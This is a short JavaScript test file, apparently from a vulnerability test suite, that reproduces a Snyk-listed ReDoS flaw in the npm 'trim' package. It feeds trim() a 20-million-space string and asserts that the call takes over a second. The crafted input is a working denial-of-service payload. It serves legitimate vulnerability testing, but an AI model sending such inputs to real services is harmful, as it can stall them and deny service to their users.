//https://snyk.io/vuln/SNYK-JS-TRIM-1017038
test("ReDos in trim", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const trim = require('trim');

    let str = "1" + genstr(20000000,' ') + "1";

    let t =measureTime(function () {
        var ts = trim(str)
    
    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});
